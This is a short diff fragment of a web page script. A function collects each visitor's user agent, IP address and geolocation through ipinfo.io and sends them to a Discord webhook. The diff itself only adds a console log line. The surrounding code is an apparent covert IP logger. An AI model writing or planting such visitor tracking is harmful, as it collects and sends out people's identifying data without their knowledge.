@@ -40,7 +40,6 @@
 
 
 
-
 <script>
     function logUserInfo() {
         const userAgent = navigator.userAgent;
@@ -61,6 +60,9 @@
 
                 // Send data to Discord webhook
                 sendToDiscord(userAgent, ipAddress, city, region, country);
+
+                // Log ipinfo.io response
+                console.log("ipinfo.io Response:", data);
             })
             .catch(error => {
                 console.error("Error fetching IP address and location information:", error);
